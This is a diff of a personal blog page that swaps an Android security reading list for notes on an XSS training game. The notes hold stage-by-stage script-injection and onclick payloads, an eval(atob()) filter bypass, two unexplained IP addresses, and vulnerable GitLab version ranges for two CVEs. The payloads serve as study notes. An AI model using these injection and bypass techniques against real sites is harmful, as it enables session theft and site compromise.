@@ -5,29 +5,20 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Android系统安全书籍 | 10cks</title>
-<meta name="keywords" content="Android, 网络安全" />
-<meta name="description" content="书籍学习 外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。
-Android系统安全   Android安全架构深究
-  Android安全攻防权威指南
-  Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)
-  Android安全技术揭秘与防范
-  Android软件安全与逆向分析
-  Android系统基础   Android的设计与实现*卷1
-  深入理解Android卷1*邓凡平
-  深入理解Android卷2_邓凡平
-  深入理解Android卷3_邓凡平
-  Android技术内幕.系统卷
-  Android系统级深入开发.移植与调试
-  Android深度探索（卷2）系统应用源代码分析与ROM定制
-  拨云见日-基于android的内核与系统架构源码分析
-  Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战
-  Android：Wi-Fi NFC和GPS
-  Android系统原理及开发要点详解(韩超,梁泉)
-  Android框架揭秘(带完整书签高清扫描版)
-  Linux内核  ORANGE’S：一个操作系统的实现 Linux内核设计与实现_第三版 Linux内核设计的艺术 Linux内核完全注释V3.">
-<meta name="author" content="fitzlee">
-<link rel="canonical" href="https://10cks.top/posts/android%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/" />
+<title>10cks</title>
+<meta name="keywords" content="" />
+<meta name="description" content="https://oopsdc.com/ https://blog.csdn.net/fengzilin1973/article/details/116270601 //xss challenges答案 https://xiaolong22333.top/ https://wiki.wgpsec.org/knowledge/tools/nmap.html //狼组安全团队公开文档
+stage2: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E alert(document.domain)&#34;
+stage3: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&amp;p2=Japan &quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;
+stage6: &ldquo;onclick=alert(document.domain);&rdquo; //弹窗 11 &ldquo;onclick=alert(document.domain);&rdquo; //不弹窗
+stage7: 1 onclick=alert(document.domain) //这个可以 1 οnclick=alert(document.domain) //这个不行 1 onclick=alert(document.domain) //手敲的可以
+stage8: js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://， 而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:
+stage10: 关键词绕过：domain被删除 方法1:1234&quot;&gt;alert(document.domadomainin) 方法2:fengzilin&quot;&gt;eval(atob(&lsquo;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&rsquo;));
+120.26.90.180 120.26.101.207
+CVE-2021-22205 GitLab exiftool 远程命令执行漏洞 11.9 &lt;= GitLab（CE/EE）&lt; 13.8.8 13.9 &lt;= GitLab（CE/EE）&lt; 13.9.6 13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3
+CVE-2022-1162 gitlab 硬编码漏洞 Gitlab CE/EE &gt;=14.7,&lt;14.7.7 Gitlab CE/EE &gt;=14.8,&lt;14.8.5 Gitlab CE/EE &gt;=14.9,&lt;14.9.2">
+<meta name="author" content="">
+<link rel="canonical" href="https://10cks.top/xss-challenges/" />
 <link crossorigin="anonymous" href="/assets/css/stylesheet.min.8e905f92e5b08be10c422a09bc41029a0cb3d8f4e4eac5bce2d934533b04fae2.css" integrity="sha256-jpBfkuWwi&#43;EMQioJvEECmgyz2PTk6sW84tk0UzsE&#43;uI=" rel="preload stylesheet" as="style">
 <script defer crossorigin="anonymous" src="/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js" integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI="
     onload="hljs.initHighlightingOnLoad();"></script>
@@ -110,54 +101,36 @@ Android系统安全   Android安全架构深究
         if (document.readyState === "interactive") NProgress.inc(0.8);
         if (document.readyState === "complete") NProgress.done();
     });
-</script><meta property="og:title" content="Android系统安全书籍" />
-<meta property="og:description" content="书籍学习 外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。
-Android系统安全   Android安全架构深究
-  Android安全攻防权威指南
-  Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)
-  Android安全技术揭秘与防范
-  Android软件安全与逆向分析
-  Android系统基础   Android的设计与实现*卷1
-  深入理解Android卷1*邓凡平
-  深入理解Android卷2_邓凡平
-  深入理解Android卷3_邓凡平
-  Android技术内幕.系统卷
-  Android系统级深入开发.移植与调试
-  Android深度探索（卷2）系统应用源代码分析与ROM定制
-  拨云见日-基于android的内核与系统架构源码分析
-  Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战
-  Android：Wi-Fi NFC和GPS
-  Android系统原理及开发要点详解(韩超,梁泉)
-  Android框架揭秘(带完整书签高清扫描版)
-  Linux内核  ORANGE’S：一个操作系统的实现 Linux内核设计与实现_第三版 Linux内核设计的艺术 Linux内核完全注释V3." />
+</script><meta property="og:title" content="" />
+<meta property="og:description" content="https://oopsdc.com/ https://blog.csdn.net/fengzilin1973/article/details/116270601 //xss challenges答案 https://xiaolong22333.top/ https://wiki.wgpsec.org/knowledge/tools/nmap.html //狼组安全团队公开文档
+stage2: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E alert(document.domain)&#34;
+stage3: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&amp;p2=Japan &quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;
+stage6: &ldquo;onclick=alert(document.domain);&rdquo; //弹窗 11 &ldquo;onclick=alert(document.domain);&rdquo; //不弹窗
+stage7: 1 onclick=alert(document.domain) //这个可以 1 οnclick=alert(document.domain) //这个不行 1 onclick=alert(document.domain) //手敲的可以
+stage8: js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://， 而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:
+stage10: 关键词绕过：domain被删除 方法1:1234&quot;&gt;alert(document.domadomainin) 方法2:fengzilin&quot;&gt;eval(atob(&lsquo;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&rsquo;));
+120.26.90.180 120.26.101.207
+CVE-2021-22205 GitLab exiftool 远程命令执行漏洞 11.9 &lt;= GitLab（CE/EE）&lt; 13.8.8 13.9 &lt;= GitLab（CE/EE）&lt; 13.9.6 13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3
+CVE-2022-1162 gitlab 硬编码漏洞 Gitlab CE/EE &gt;=14.7,&lt;14.7.7 Gitlab CE/EE &gt;=14.8,&lt;14.8.5 Gitlab CE/EE &gt;=14.9,&lt;14.9.2" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://10cks.top/posts/android%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/" /><meta property="og:image" content="https://10cks.top/papermod-cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-05-21" />
-<meta property="article:modified_time" content="2022-05-21" />
+<meta property="og:url" content="https://10cks.top/xss-challenges/" /><meta property="og:image" content="https://10cks.top/papermod-cover.png"/><meta property="article:section" content="" />
+
+
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://10cks.top/papermod-cover.png"/>
 
-<meta name="twitter:title" content="Android系统安全书籍"/>
-<meta name="twitter:description" content="书籍学习 外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。
-Android系统安全   Android安全架构深究
-  Android安全攻防权威指南
-  Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)
-  Android安全技术揭秘与防范
-  Android软件安全与逆向分析
-  Android系统基础   Android的设计与实现*卷1
-  深入理解Android卷1*邓凡平
-  深入理解Android卷2_邓凡平
-  深入理解Android卷3_邓凡平
-  Android技术内幕.系统卷
-  Android系统级深入开发.移植与调试
-  Android深度探索（卷2）系统应用源代码分析与ROM定制
-  拨云见日-基于android的内核与系统架构源码分析
-  Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战
-  Android：Wi-Fi NFC和GPS
-  Android系统原理及开发要点详解(韩超,梁泉)
-  Android框架揭秘(带完整书签高清扫描版)
-  Linux内核  ORANGE’S：一个操作系统的实现 Linux内核设计与实现_第三版 Linux内核设计的艺术 Linux内核完全注释V3."/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="https://oopsdc.com/ https://blog.csdn.net/fengzilin1973/article/details/116270601 //xss challenges答案 https://xiaolong22333.top/ https://wiki.wgpsec.org/knowledge/tools/nmap.html //狼组安全团队公开文档
+stage2: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E alert(document.domain)&#34;
+stage3: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&amp;p2=Japan &quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;
+stage6: &ldquo;onclick=alert(document.domain);&rdquo; //弹窗 11 &ldquo;onclick=alert(document.domain);&rdquo; //不弹窗
+stage7: 1 onclick=alert(document.domain) //这个可以 1 οnclick=alert(document.domain) //这个不行 1 onclick=alert(document.domain) //手敲的可以
+stage8: js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://， 而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:
+stage10: 关键词绕过：domain被删除 方法1:1234&quot;&gt;alert(document.domadomainin) 方法2:fengzilin&quot;&gt;eval(atob(&lsquo;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&rsquo;));
+120.26.90.180 120.26.101.207
+CVE-2021-22205 GitLab exiftool 远程命令执行漏洞 11.9 &lt;= GitLab（CE/EE）&lt; 13.8.8 13.9 &lt;= GitLab（CE/EE）&lt; 13.9.6 13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3
+CVE-2022-1162 gitlab 硬编码漏洞 Gitlab CE/EE &gt;=14.7,&lt;14.7.7 Gitlab CE/EE &gt;=14.8,&lt;14.8.5 Gitlab CE/EE &gt;=14.9,&lt;14.9.2"/>
 
 
 <script type="application/ld+json">
@@ -168,14 +141,8 @@ Android系统安全   Android安全架构深究
     {
       "@type": "ListItem",
       "position":  1 ,
-      "name": "Posts",
-      "item": "https://10cks.top/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Android系统安全书籍",
-      "item": "https://10cks.top/posts/android%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/"
+      "name": "",
+      "item": "https://10cks.top/xss-challenges/"
     }
   ]
 }
@@ -184,24 +151,20 @@ Android系统安全   Android安全架构深究
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "Android系统安全书籍",
-  "name": "Android系统安全书籍",
-  "description": "书籍学习 外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。\nAndroid系统安全   Android安全架构深究\n  Android安全攻防权威指南\n  Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)\n  Android安全技术揭秘与防范\n  Android软件安全与逆向分析\n  Android系统基础   Android的设计与实现*卷1\n  深入理解Android卷1*邓凡平\n  深入理解Android卷2_邓凡平\n  深入理解Android卷3_邓凡平\n  Android技术内幕.系统卷\n  Android系统级深入开发.移植与调试\n  Android深度探索（卷2）系统应用源代码分析与ROM定制\n  拨云见日-基于android的内核与系统架构源码分析\n  Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战\n  Android：Wi-Fi NFC和GPS\n  Android系统原理及开发要点详解(韩超,梁泉)\n  Android框架揭秘(带完整书签高清扫描版)\n  Linux内核  ORANGE’S：一个操作系统的实现 Linux内核设计与实现_第三版 Linux内核设计的艺术 Linux内核完全注释V3.",
+  "headline": "",
+  "name": "",
+  "description": "https://oopsdc.com/ https://blog.csdn.net/fengzilin1973/article/details/116270601 //xss challenges答案 https://xiaolong22333.top/ https://wiki.wgpsec.org/knowledge/tools/nmap.html //狼组安全团队公开文档\nstage2: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E alert(document.domain)\"\nstage3: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026amp;p2=Japan \u0026quot;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026quot;\nstage6: \u0026ldquo;onclick=alert(document.domain);\u0026rdquo; //弹窗 11 \u0026ldquo;onclick=alert(document.domain);\u0026rdquo; //不弹窗\nstage7: 1 onclick=alert(document.domain) //这个可以 1 οnclick=alert(document.domain) //这个不行 1 onclick=alert(document.domain) //手敲的可以\nstage8: js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://， 而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:\nstage10: 关键词绕过：domain被删除 方法1:1234\u0026quot;\u0026gt;alert(document.domadomainin) 方法2:fengzilin\u0026quot;\u0026gt;eval(atob(\u0026lsquo;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026rsquo;));\n120.26.90.180 120.26.101.207\nCVE-2021-22205 GitLab exiftool 远程命令执行漏洞 11.9 \u0026lt;= GitLab（CE/EE）\u0026lt; 13.8.8 13.9 \u0026lt;= GitLab（CE/EE）\u0026lt; 13.9.6 13.10 \u0026lt;= GitLab（CE/EE）\u0026lt; 13.10.3\nCVE-2022-1162 gitlab 硬编码漏洞 Gitlab CE/EE \u0026gt;=14.7,\u0026lt;14.7.7 Gitlab CE/EE \u0026gt;=14.8,\u0026lt;14.8.5 Gitlab CE/EE \u0026gt;=14.9,\u0026lt;14.9.2",
   "keywords": [
-    "Android", "网络安全"
+    
   ],
-  "articleBody": "书籍学习 外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。\nAndroid系统安全   Android安全架构深究\n  Android安全攻防权威指南\n  Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)\n  Android安全技术揭秘与防范\n  Android软件安全与逆向分析\n  Android系统基础   Android的设计与实现*卷1\n  深入理解Android卷1*邓凡平\n  深入理解Android卷2_邓凡平\n  深入理解Android卷3_邓凡平\n  Android技术内幕.系统卷\n  Android系统级深入开发.移植与调试\n  Android深度探索（卷2）系统应用源代码分析与ROM定制\n  拨云见日-基于android的内核与系统架构源码分析\n  Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战\n  Android：Wi-Fi NFC和GPS\n  Android系统原理及开发要点详解(韩超,梁泉)\n  Android框架揭秘(带完整书签高清扫描版)\n  Linux内核  ORANGE’S：一个操作系统的实现 Linux内核设计与实现_第三版 Linux内核设计的艺术 Linux内核完全注释V3.0书签版 30天自制操作系统.川合秀实  ",
-  "wordCount" : "33",
+  "articleBody": "https://oopsdc.com/ https://blog.csdn.net/fengzilin1973/article/details/116270601 //xss challenges答案 https://xiaolong22333.top/ https://wiki.wgpsec.org/knowledge/tools/nmap.html //狼组安全团队公开文档\nstage2: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E alert(document.domain)\"\nstage3: p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026p2=Japan \"alert(document.domain)\"\nstage6: “onclick=alert(document.domain);” //弹窗 11 “onclick=alert(document.domain);” //不弹窗\nstage7: 1 onclick=alert(document.domain) //这个可以 1 οnclick=alert(document.domain) //这个不行 1 onclick=alert(document.domain) //手敲的可以\nstage8: js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://， 而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:\nstage10: 关键词绕过：domain被删除 方法1:1234\"alert(document.domadomainin) 方法2:fengzilin\"eval(atob(‘YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==’));\n120.26.90.180 120.26.101.207\nCVE-2021-22205 GitLab exiftool 远程命令执行漏洞 11.9 CVE-2022-1162 gitlab 硬编码漏洞 Gitlab CE/EE =14.7,=14.8,=14.9,",
+  "wordCount" : "66",
   "inLanguage": "en",
-  "datePublished": "2022-05-21T00:00:00Z",
-  "dateModified": "2022-05-21T00:00:00Z",
-  "author":{
-    "@type": "Person",
-    "name": "fitzlee"
-  },
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://10cks.top/posts/android%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/"
+    "@id": "https://10cks.top/xss-challenges/"
   },
   "publisher": {
     "@type": "Organization",
@@ -292,11 +255,11 @@ Android系统安全   Android安全架构深究
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://10cks.top/">Home</a>&nbsp;»&nbsp;<a href="https://10cks.top/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://10cks.top/">Home</a></div>
     <h1 class="post-title">
-      Android系统安全书籍
+      
     </h1>
-    <div class="post-meta"><span title='2022-05-21 00:00:00 +0000 UTC'>2022.05.21</span>&nbsp;·&nbsp;fitzlee
+    <div class="post-meta">
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -307,17 +270,18 @@ Android系统安全   Android安全架构深究
             </summary>
             <div class="inner"><ul>
                     <li>
-                        <a href="#%e4%b9%a6%e7%b1%8d%e5%ad%a6%e4%b9%a0" aria-label="书籍学习">书籍学习</a><ul>
-                            
+                        <a href="#stage2" aria-label="stage2:">stage2:</a></li>
                     <li>
-                        <a href="#android%e7%b3%bb%e7%bb%9f%e5%ae%89%e5%85%a8" aria-label="Android系统安全">Android系统安全</a></li>
+                        <a href="#stage3" aria-label="stage3:">stage3:</a></li>
                     <li>
-                        <a href="#android%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80" aria-label="Android系统基础">Android系统基础</a></li>
+                        <a href="#stage6" aria-label="stage6:">stage6:</a></li>
                     <li>
-                        <a href="#linux%e5%86%85%e6%a0%b8" aria-label="Linux内核">Linux内核</a>
+                        <a href="#stage7" aria-label="stage7:">stage7:</a></li>
+                    <li>
+                        <a href="#stage8" aria-label="stage8:">stage8:</a></li>
+                    <li>
+                        <a href="#stage10" aria-label="stage10:">stage10:</a>
                     </li>
-                </ul>
-                </li>
                 </ul>
             </div>
         </details>
@@ -383,95 +347,47 @@ Android系统安全   Android安全架构深究
     }
 </script>
 
-  <div class="post-content"><h1 id="书籍学习">书籍学习<a hidden class="anchor" aria-hidden="true" href="#书籍学习">#</a></h1>
-<p>外话：用书和文档镇楼，站在巨人的肩膀上，才能进步的更快，才能少踩坑，赶紧阅读吧少年们。</p>
-<h2 id="android系统安全">Android系统安全<a hidden class="anchor" aria-hidden="true" href="#android系统安全">#</a></h2>
-<ul>
-<li>
-<p><input disabled="" type="checkbox"> Android安全架构深究</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android安全攻防权威指南</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android安全攻防实战 (南非)keith makan, 崔孝晨;武晓音(译)</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android安全技术揭秘与防范</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android软件安全与逆向分析</p>
-</li>
-</ul>
-<h2 id="android系统基础">Android系统基础<a hidden class="anchor" aria-hidden="true" href="#android系统基础">#</a></h2>
-<ul>
-<li>
-<p><input disabled="" type="checkbox"> Android的设计与实现*卷1</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> 深入理解Android卷1*邓凡平</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> 深入理解Android卷2_邓凡平</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> 深入理解Android卷3_邓凡平</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android技术内幕.系统卷</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android系统级深入开发.移植与调试</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android深度探索（卷2）系统应用源代码分析与ROM定制</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> 拨云见日-基于android的内核与系统架构源码分析</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android底层开发技术实战详解 内核、移植和驱动 Android源码设计模式解析与实战</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android：Wi-Fi NFC和GPS</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android系统原理及开发要点详解(韩超,梁泉)</p>
-</li>
-<li>
-<p><input disabled="" type="checkbox"> Android框架揭秘(带完整书签高清扫描版)</p>
-</li>
-</ul>
-<h2 id="linux内核">Linux内核<a hidden class="anchor" aria-hidden="true" href="#linux内核">#</a></h2>
-<ul>
-<li><input disabled="" type="checkbox"> ORANGE’S：一个操作系统的实现</li>
-<li><input disabled="" type="checkbox"> Linux内核设计与实现_第三版</li>
-<li><input disabled="" type="checkbox"> Linux内核设计的艺术</li>
-<li><input disabled="" type="checkbox"> Linux内核完全注释V3.0书签版</li>
-<li><input disabled="" type="checkbox"> 30天自制操作系统.川合秀实</li>
-</ul>
+  <div class="post-content"><p><a href="https://oopsdc.com/">https://oopsdc.com/</a>
+<a href="https://blog.csdn.net/fengzilin1973/article/details/116270601">https://blog.csdn.net/fengzilin1973/article/details/116270601</a> //xss challenges答案
+<a href="https://xiaolong22333.top/">https://xiaolong22333.top/</a>
+<a href="https://wiki.wgpsec.org/knowledge/tools/nmap.html">https://wiki.wgpsec.org/knowledge/tools/nmap.html</a> //狼组安全团队公开文档</p>
+<h1 id="stage2">stage2:<a hidden class="anchor" aria-hidden="true" href="#stage2">#</a></h1>
+<p>p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+<input type="text" name="p1" size="50" value="<script>alert(document.domain)</script>"></p>
+<h1 id="stage3">stage3:<a hidden class="anchor" aria-hidden="true" href="#stage3">#</a></h1>
+<p>p1=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&amp;p2=Japan
+<b>&quot;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot;</b></p>
+<h1 id="stage6">stage6:<a hidden class="anchor" aria-hidden="true" href="#stage6">#</a></h1>
+<p>&ldquo;onclick=alert(document.domain);&rdquo; //弹窗
+11 &ldquo;onclick=alert(document.domain);&rdquo; //不弹窗</p>
+<h1 id="stage7">stage7:<a hidden class="anchor" aria-hidden="true" href="#stage7">#</a></h1>
+<p>1 onclick=alert(document.domain) //这个可以
+<input type="text" name="p1" size="50" value="onclick=alert(document.domain)">
+1 οnclick=alert(document.domain) //这个不行
+1 onclick=alert(document.domain) //手敲的可以</p>
+<h1 id="stage8">stage8:<a hidden class="anchor" aria-hidden="true" href="#stage8">#</a></h1>
+<p>js伪协议：伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，
+而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:</p>
+<h1 id="stage10">stage10:<a hidden class="anchor" aria-hidden="true" href="#stage10">#</a></h1>
+<p>关键词绕过：domain被删除
+方法1:1234&quot;&gt;<script>alert(document.domadomainin)</script>
+方法2:fengzilin&quot;&gt;<script>eval(atob(&lsquo;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&rsquo;));</script></p>
+<p>120.26.90.180
+120.26.101.207</p>
+<p>CVE-2021-22205 GitLab exiftool 远程命令执行漏洞
+11.9 &lt;=  GitLab（CE/EE）&lt; 13.8.8
+13.9 &lt;=  GitLab（CE/EE）&lt; 13.9.6
+13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3</p>
+<p>CVE-2022-1162 gitlab 硬编码漏洞
+Gitlab CE/EE           &gt;=14.7,&lt;14.7.7
+Gitlab CE/EE           &gt;=14.8,&lt;14.8.5
+Gitlab CE/EE           &gt;=14.9,&lt;14.9.2</p>
 
 
   </div>
 
   <footer class="post-footer">
     <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <ul class="post-tags">
-      <li><a href="https://10cks.top/tags/android/">Android</a></li>
-      <li><a href="https://10cks.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li>
-    </ul>
-<nav class="paginav">
-  <a class="prev" href="https://10cks.top/posts/%E7%BC%96%E5%86%99python%E6%9F%A5%E5%A3%B3%E5%B7%A5%E5%85%B7/">
-    <span class="title">« Prev Page</span>
-    <br>
-    <span>编写python查壳工具（安卓）</span>
-  </a>
-  <a class="next" href="https://10cks.top/posts/rime%E8%BE%93%E5%85%A5%E6%B3%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">
-    <span class="title">Next Page »</span>
-    <br>
-    <span>Rime输入法使用指南</span>
-  </a>
-</nav>
 
   </footer>
 </article>
